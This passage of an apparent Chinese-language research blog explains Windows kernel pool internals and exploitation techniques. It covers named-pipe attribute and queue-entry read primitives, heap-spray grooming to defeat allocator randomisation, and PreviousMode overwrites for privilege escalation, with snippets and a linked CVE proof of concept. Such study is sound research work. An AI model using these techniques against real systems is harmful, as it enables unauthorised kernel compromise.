</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dq ffff998533f74440 L2
</span></span><span style="display:flex;"><span>ffff9985`<span style="color:#bd93f9">33f</span><span style="color:#bd93f9">74440</span>  <span style="color:#bd93f9">88</span>a74e1e`<span style="color:#bd93f9">7e507045</span> ffff9985`<span style="color:#bd93f9">0000004</span><span style="color:#bd93f9">9</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dt _HEAP_VS_CHUNK_HEADER ffff998533f74440
</span></span><span style="display:flex;"><span>ntdll<span style="color:#ff79c6">!</span>_HEAP_VS_CHUNK_HEADER
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">Sizes</span>            : _HEAP_VS_CHUNK_HEADER_SIZE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">EncodedSegmentPageOffset</span> : <span style="color:#bd93f9">0</span>y01001001 (<span style="color:#bd93f9">0x49</span>)
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">UnusedBytes</span>      : <span style="color:#bd93f9">0</span>y0
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">SkipDuringWalk</span>   : <span style="color:#bd93f9">0</span>y0
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">Spare</span>            : <span style="color:#bd93f9">0</span>y0000000000000000000000 (<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">AllocatedChunkBits</span> : <span style="color:#bd93f9">0x49</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dx <span style="color:#ff79c6">-</span>id <span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,ffff998520ad7080 <span style="color:#ff79c6">-</span>r1 (<span style="color:#ff79c6">*</span>((ntdll<span style="color:#ff79c6">!</span>_HEAP_VS_CHUNK_HEADER_SIZE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0xffff998533f74440</span>))
</span></span><span style="display:flex;"><span>(<span style="color:#ff79c6">*</span>((ntdll<span style="color:#ff79c6">!</span>_HEAP_VS_CHUNK_HEADER_SIZE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0xffff998533f74440</span>))                 [<span style="color:#8be9fd;font-style:italic">Type</span>: _HEAP_VS_CHUNK_HEADER_SIZE]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> (<span style="color:#bd93f9">15</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>)] <span style="color:#8be9fd;font-style:italic">MemoryCost</span>       : <span style="color:#bd93f9">0x7045</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> (<span style="color:#bd93f9">31</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">16</span>)] <span style="color:#8be9fd;font-style:italic">UnsafeSize</span>       : <span style="color:#bd93f9">0x7e50</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x004</span> (<span style="color:#bd93f9">15</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>)] <span style="color:#8be9fd;font-style:italic">UnsafePrevSize</span>   : <span style="color:#bd93f9">0x4e1e</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x004</span> (<span style="color:#bd93f9">23</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">16</span>)] <span style="color:#8be9fd;font-style:italic">Allocated</span>        : <span style="color:#bd93f9">0xa7</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span>] <span style="color:#8be9fd;font-style:italic">KeyUShort</span>        : <span style="color:#bd93f9">0x7045</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">short</span>]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span>] <span style="color:#8be9fd;font-style:italic">KeyULong</span>         : <span style="color:#bd93f9">0x7e507045</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>]
</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span>] <span style="color:#8be9fd;font-style:italic">HeaderBits</span>       : <span style="color:#bd93f9">0x88a74e1e7e507045</span> [<span style="color:#8be9fd;font-style:italic">Type</span>: <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span>]
</span></span></code></pre></div><p>在内部，VS分配器使用段分配器。它通过<code>_HEAP_VS_CONTXT</code>中的<code>_HEAP_SUBALLOCATOR_CALLBACKS</code>字段在<code>RtlpHpVsSubsegmentCreate</code>中使用。<strong>子分配器回调函数都与VS上下文和RtlpHpHeapGlobals地址进行异或</strong>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>callbacks.Allocate <span style="color:#ff79c6">=</span> RtlpHpSegVsAllocate;
</span></span><span style="display:flex;"><span>callbacks.Free <span style="color:#ff79c6">=</span> RtlpHpSegLfhVsFree;
</span></span><span style="display:flex;"><span>callbacks.Commit <span style="color:#ff79c6">=</span> RtlpHpSegLfhVsCommit;
</span></span><span style="display:flex;"><span>callbacks.Decommit <span style="color:#ff79c6">=</span> RtlpHpSegLfhVsDecommit;
</span></span><span style="display:flex;"><span>callbacks.ExtendContext <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span></code></pre></div><h5 id="low-fragmentation-heap-backend">Low Fragmentation Heap Backend</h5>
<p>Low Fragmentation Heap Backend是一个后端，专门为从1B ~ 512 B 分配。LFH后端上下文存储在_HEAP_LFH_CONTEXT的结构体中。LFH后端的主要特点是使用不同大小的bucket来避免碎片化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd <span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span> _HEAP_LFH_CONTEXT
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">BackendCtx</span> : Ptr64 Void
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">Callbacks</span> : _HEAP_SUBALLOCATOR_CALLBACKS
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x030 <span style="color:#8be9fd;font-style:italic">AffinityModArray</span> : Ptr64 UChar
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x038 <span style="color:#8be9fd;font-style:italic">MaxAffinity</span> : UChar
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x039 <span style="color:#8be9fd;font-style:italic">LockType</span> : UChar
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x03a <span style="color:#8be9fd;font-style:italic">MemStatsOffset</span> : Int2B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x03c <span style="color:#8be9fd;font-style:italic">Config</span> : _RTL_HP_LFH_CONFIG
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x040 <span style="color:#8be9fd;font-style:italic">BucketStats</span> : _HEAP_LFH_SUBSEGMENT_STATS
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x048 <span style="color:#8be9fd;font-style:italic">SubsegmentCreationLock</span> : Uint8B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x080 <span style="color:#8be9fd;font-style:italic">Buckets</span> : [<span style="color:#bd93f9">129</span>] Ptr64 _HEAP_LFH_BUCKET
</span></span></code></pre></div><h5 id="缓存对齐">缓存对齐</h5>
<p>随着内核层堆分配器的更新，<code>_POOL_HEADER</code>的大部分字段都是无用的</p>
<p>但是PoolTag和PoolType都是比较重要的</p>
<p>调用了ExAllocatePoolWithTag时,如果PoolType设置了CacheAligned,那么返回的内存将是与缓存行大小对齐的,这个值取决于cpu,通常为0x40。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>PagedPoolCacheAligned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n5
</span></span><span style="display:flex;"><span>NonPagedPoolCacheAligned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n4
</span></span></code></pre></div><p>如果分配的地址没有正确的对齐，那么块可能会有两个headers。</p>
<h4 id="generic-exploitation">Generic Exploitation</h4>
<p>堆溢出，幽灵块，这里介绍了的攻击方式，都是NamedPipe，分别在PagedPool和NonPagedPool中</p>
<h5 id="pipeattribute">PipeAttribute</h5>
<p>BigPool: 分配必须足够大(x64上为4064+字节)才能在大池中处理</p>
<p>论文中介绍了PagedPool的比较好用的任意读写的方法：PipeAttribute</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">PipeAttribute</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    LIST_ENTRY list;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>AttributeName;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint64_t</span> AttributeValueSize;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>AttributeValue;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> data[<span style="color:#bd93f9">0</span>];
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>分配的大小和数据完全由攻击者控制。<code>AttributeName</code>和<code>AttributeValue</code>是指向数据字段的不同偏移的指针。 可以使用<code>NtFsControlFile</code>系统调用和<code>0x11003C</code>控制码在管道上创建管道属性，如下所示：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>HANDLE read_pipe;
</span></span><span style="display:flex;"><span>HANDLE write_pipe;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">char</span> attribute[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34; attribute_name </span><span style="color:#f1fa8c">\00</span><span style="color:#f1fa8c"> attribute_value &#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">char</span> output[<span style="color:#bd93f9">0x100</span>];
</span></span><span style="display:flex;"><span>CreatePipe(read_pipe, write_pipe, <span style="color:#8be9fd;font-style:italic">NULL</span>, bufsize);
</span></span><span style="display:flex;"><span>NtFsControlFile(write_pipe,
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&amp;</span>status,
</span></span><span style="display:flex;"><span>                <span style="color:#bd93f9">0x11003C</span>,
</span></span><span style="display:flex;"><span>                attribute,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">sizeof</span>(attribute),
</span></span><span style="display:flex;"><span>                output,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">sizeof</span>(output));
</span></span></code></pre></div><p>然后可以使用<code>0x110038</code>控制码读取属性的值。<code>AttributeValue</code>指针和<code>AttributeValueSize</code>将用于读取属性的值并将其返回给用户。属性的值可以更改，但这将触发先前<code>PipeAttribute</code>的释放和新分配。</p>
<p>这意味着如果攻击者能够控制<code>PipeAttribute</code>的<code>AttributeValue</code>和<code>AttributeValueSize</code>字段，它可以在内核中读取任意数据，但不能任意写入。该对象还可以用于在内核中放置任意数据。这意味着它可以用于重新分配易受攻击块并控制幽灵块的内容。</p>
<h5 id="npfr">NpFr</h5>
<p>WriteFile写NamedPipe会获得chunk，也是可以造成任意读，只要能控制<code>Irp</code>和<code>isDataInKernel</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">PipeQueueEntry</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    LIST_ENTRY list;
</span></span><span style="display:flex;"><span>    IRP <span style="color:#ff79c6">*</span>linkedIRP;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__int64</span> SecurityClientContext;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> isDataInKernel;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> remaining_bytes__;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> DataSize;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> field_2C;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> data[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 读pipe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">if</span> (PipeQueueEntry<span style="color:#ff79c6">-&gt;</span>isDataAllocated <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    data_ptr <span style="color:#ff79c6">=</span> (PipeQueueEntry<span style="color:#ff79c6">-&gt;</span>linkedIRP<span style="color:#ff79c6">-&gt;</span>SystemBuffer);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>    data_ptr <span style="color:#ff79c6">=</span> PipeQueueEntry<span style="color:#ff79c6">-&gt;</span>data;
</span></span><span style="display:flex;"><span>[...] 
</span></span><span style="display:flex;"><span>memmove((<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)(dst_buf <span style="color:#ff79c6">+</span> dst_len <span style="color:#ff79c6">-</span> cur_read_offset), <span style="color:#ff79c6">&amp;</span>data_ptr[PipeQueueEntry<span style="color:#ff79c6">-&gt;</span>DataSize <span style="color:#ff79c6">-</span> cur_entry_offset], copy_size);
</span></span></code></pre></div><h4 id="spray">spray</h4>
<p>为了获得第所需的内存布局，需要进行一些spray。spray取决于易受攻击的块的大小，因为它将最终分配到不同的分配后端。</p>
<p>为了简化spray过程，可以确保相应的<code>lookaside</code>为空。分配超过256个相同大小的块将确保这一点。</p>
<p>如果易受攻击的块小于0x200，则它将位于LFH（低碎片化堆）后端。然后，spray应该使用完全相同大小的块进行，对应桶的粒度取模，以确保它们都从同一个桶中分配。当请求分配时，LFH后端将按照最多32个块的组进行扫描<code>BlockBitmap</code>，并随机选择一个空闲块。在易受攻击的块分配之前和之后分配超过32个块应有助于打败随机化。</p>
<p>如果易受攻击的块大于<code>0x200</code>但小于<code>0x10000</code>，则它将位于可变大小（Variable Size）后端。然后，spray应该使用与易受攻击的块大小相等的大小进行。较大的块可能会被拆分，从而导致喷洒失败。首先，分配数千个所选大小的块，以确保首先将<code>FreeChunkTree</code>中大于所选大小的所有块清空，然后分配器将分配一个新的<code>0x10000</code>字节的VS子段并将其放入<code>FreeChunkTree</code>中。然后分配另外数千个块，它们将最终位于新的大空闲块中，从而连续。然后释放最后分配块的三分之一，以填充<code>FreeChunkTree</code>。只释放三分之一将确保不会合并任何块。然后让易受攻击的块分配。</p>
<p>最后，可以重新分配已释放的块以最大化喷洒机会。</p>
<p>由于完整的利用技术需要释放和重新分配易受攻击的块和幽灵块，为了方便释放块的恢复，启用相应的动态<code>lookaside</code>非常有趣。为此，一个简单的解决方案是分配数千个相应大小的块，等待2秒钟，然后再分配数千个块并等待1秒钟。这样，我们可以确保平衡集管理器已经重新平衡了相应的<code>lookaside</code>。分配数千个块确保<code>lookaside</code>将成为最常用的<code>lookaside</code>，并且将被启用，并且还确保它在其中有足够的空间。</p>
<h4 id="io-ring">IO Ring</h4>
<p>win11不错的漏洞利用对象。</p>
<p>复现了相关CVE：<a href="https://github.com/ldrx30/CVE-2023-21768">CVE-2023-21768 Proof of Concept</a></p>
<h4 id="previousmode">PreviousMode</h4>
<p>修改<code>_KTHREAD.PreviousMode</code>字段。</p>
<p>用户态程序调用系统的 Nt 或 Zw 时，系统调用机制会将调用线程捕获到内核模式。 为了标识参数源自用户模式，系统调用的处理程序将调用方线程对象中的 PreviousMode 字段设置为 UserMode。</p>
<p>而内核态程序调用系统例程并将参数值传递给来自内核态的例程，当前线程对象中的 PreviousMode 字段应为 KernelMode。</p>
<p>系统会检查调用线程的 PreviousMode 字段。这样通过参数就可以知道是来自用户态还是内核态了。</p>
<p>所以当 PreviousMode 设置为 1 时，来自用户空间的NT 或 Zw 版本函数调用将其中进行地址验证。在这种情况下，对内核内存的任意写将失败，因为此时PreviousMode是用户态的状态。当 PreviousMode 设置为 0 (此时是内核态) 时，将跳过地址验证写入任意内核内存地址，从而完成提权。</p>
<p>当我们替换<code>PreviousMode</code>为<code>0</code>后，这意味着我们可以使用<code>NtWriteVirtualMemory</code>在整个内核内存中进行不受约束的RW。</p>
<ul>
<li><code>NtReadVirtualMemory</code> 和 <code>NtWriteVirtualMemory</code> 调用函数相同（<code>MiReadWriteVirtualMemory</code>），因此在一定方面 NtWriteVirtualMemory 也可以任意读</li>
</ul>
<h4 id="new">New</h4>
<p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/updating-deprecated-exallocatepool-calls">ExAllocatePool2 和 ExAllocatePool3 </a>，在低版本的Windows系统中会导致无法加载驱动🤣</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>DECLSPEC_RESTRICT PVOID <span style="color:#50fa7b">ExAllocatePool2</span>(
</span></span><span style="display:flex;"><span>  POOL_FLAGS Flags,
</span></span><span style="display:flex;"><span>  SIZE_T     NumberOfBytes,
</span></span><span style="display:flex;"><span>  ULONG      Tag
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Old code
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>PVOID Allocation <span style="color:#ff79c6">=</span> ExAllocatePoolWithTag(PagedPool, <span style="color:#bd93f9">100</span>, &#39;abcd&#39;);
</span></span><span style="display:flex;"><span>RtlZeroMemory(Allocation, <span style="color:#bd93f9">100</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// New code
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>PVOID Allocation <span style="color:#ff79c6">=</span> ExAllocatePool2(POOL_FLAG_PAGED, <span style="color:#bd93f9">100</span>, &#39;abcd&#39;);
</span></span></code></pre></div><h3 id="npfssys">NPFS.SYS</h3>
<p>named pipe file system，常见的结构体</p>
<p>这一篇文章：<a href="https://bbs.kanxue.com/thread-278483.htm#msg_header_h2_4">新型Windows内核池风水利用工具研究</a></p>
<ul>
<li>命名管道的后端实现在一个名为NPFS.SYS驱动中，模块的主要实现和公开的<a href="https://doxygen.reactos.org/dir_552a77878df93326bbe516beefdc08b2.html">npfs模块reactos源码</a>基本上大致相同。</li>
</ul>
<h4 id="data_queue_entry">DATA_QUEUE_ENTRY</h4>
<p>Queue: 双向链表</p>
<p>SecurityContext</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>nt<span style="color:#ff79c6">!</span>_SECURITY_CLIENT_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">SecurityQos</span>      : _SECURITY_QUALITY_OF_SERVICE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x010</span> <span style="color:#8be9fd;font-style:italic">ClientToken</span>      : Ptr64 Void
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x018</span> <span style="color:#8be9fd;font-style:italic">DirectlyAccessClientToken</span> : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x019</span> <span style="color:#8be9fd;font-style:italic">DirectAccessEffectiveOnly</span> : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x01a</span> <span style="color:#8be9fd;font-style:italic">ServerIsRemote</span>   : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x01c</span> <span style="color:#8be9fd;font-style:italic">ClientTokenControl</span> : _TOKEN_CONTROL
</span></span></code></pre></div><p>EntryType</p>
<ul>
<li>Buffered Entries：这个值为0，当调用ReadFile时从<code>DATA_QUEUE_ENTRY.data</code>读取数据</li>
<li>Unbuffered Entries: 值为1，当调用ReadFile时从<code>DATA_QUEUE_ENTRY.Irp-&gt;AssociatedIrp.SystemBuffer</code>读取数据</li>
</ul>
<p><strong>QuotaInEntry</strong>: 被消耗</p>
<ul>
<li>buffered entries,：开始是DataSize，每当读取一次，就会较少，直到0</li>
<li>unbuffered entries：0</li>
</ul>
<p><strong>DataSize</strong>: user data的长度</p>
<p>x: padding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_DATA_QUEUE_ENTRY</span>{
</span></span><span style="display:flex;"><span>    LIST_ENTRY Queue;   
</span></span><span style="display:flex;"><span>    _IRP<span style="color:#ff79c6">*</span> Irp;
</span></span><span style="display:flex;"><span>    _SECURITY_CLIENT_CONTEXT<span style="color:#ff79c6">*</span> SecurityContext;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> EntryType;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> QuotaInEntry;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> DataSize;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> x;
</span></span><span style="display:flex;"><span>} DATA_QUEUE_ENTRY,<span style="color:#ff79c6">*</span>PDATA_QUEUE_ENTRY;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_NP_DATA_QUEUE</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    LIST_ENTRY Queue;
</span></span><span style="display:flex;"><span>    ULONG QueueState;
</span></span><span style="display:flex;"><span>    ULONG BytesInQueue;
</span></span><span style="display:flex;"><span>    ULONG EntriesInQueue;
</span></span><span style="display:flex;"><span>    ULONG QuotaUsed;
</span></span><span style="display:flex;"><span>    ULONG ByteOffset;
</span></span><span style="display:flex;"><span>    ULONG Quota;
</span></span><span style="display:flex;"><span>} NP_DATA_QUEUE, <span style="color:#ff79c6">*</span>PNP_DATA_QUEUE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//nSize指定了pipe的最大容量
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>BOOL <span style="color:#50fa7b">CreatePipe</span>(
</span></span><span style="display:flex;"><span>  [out]          PHANDLE               hReadPipe,
</span></span><span style="display:flex;"><span>  [out]          PHANDLE               hWritePipe,
</span></span><span style="display:flex;"><span>  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,
</span></span><span style="display:flex;"><span>  [in]           DWORD                 nSize
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>通过<code>CreatePipe</code>创建命名管道文件对象，文件实例绑定了一个名为NP_DATA_QUEUE类型的队列对象</p>
<p>CreatePipe的参数nSize指定了当前pipe的最大容量或者说是允许最大缓冲区长度,每对pipe进行一次读写操作就会增加一个DATA_QUEUE_ENTRY。</p>
<p>若干次写可以对应若干次读,当存在读数据的请求时irp就会挂起,直到写入请求的数据量达到读取请求的数据量才会完成整个读取irp请求,比如说pipe的容量是1000,第一次写了1000的数据,这个写请求会返回,第二次又写了1000数据那么这个请求就一直挂起,直到读取了1000数据后,最后写入的数据小于或等于pipe的容量,后面写请求才会返回.</p>
<h4 id="npfsnpadddataqueueentry">npfs!NpAddDataQueueEntry</h4>
<p>可以下断点😋</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define POOL_FLAG_REQUIRED_START 0x0000000000000001UI64
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define POOL_FLAG_USE_QUOTA 0x0000000000000001UI64 </span><span style="color:#6272a4">// Charge quota
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define POOL_FLAG_NON_PAGED 0x0000000000000040UI64 </span><span style="color:#6272a4">// Non paged pool NX
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>a5 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v14 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">48</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( a4 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v14 <span style="color:#ff79c6">=</span> Size <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">int</span>)Size <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span> <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)Size )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        NpFreeClientSecurityContext(v12);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xC000000D</span>i64;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v24 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(a3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">28</span>) <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(a3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">32</span>);
</span></span><span style="display:flex;"><span>    v15 <span style="color:#ff79c6">=</span> Size <span style="color:#ff79c6">-</span> a9;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v24 <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)Size <span style="color:#ff79c6">-</span> a9 )
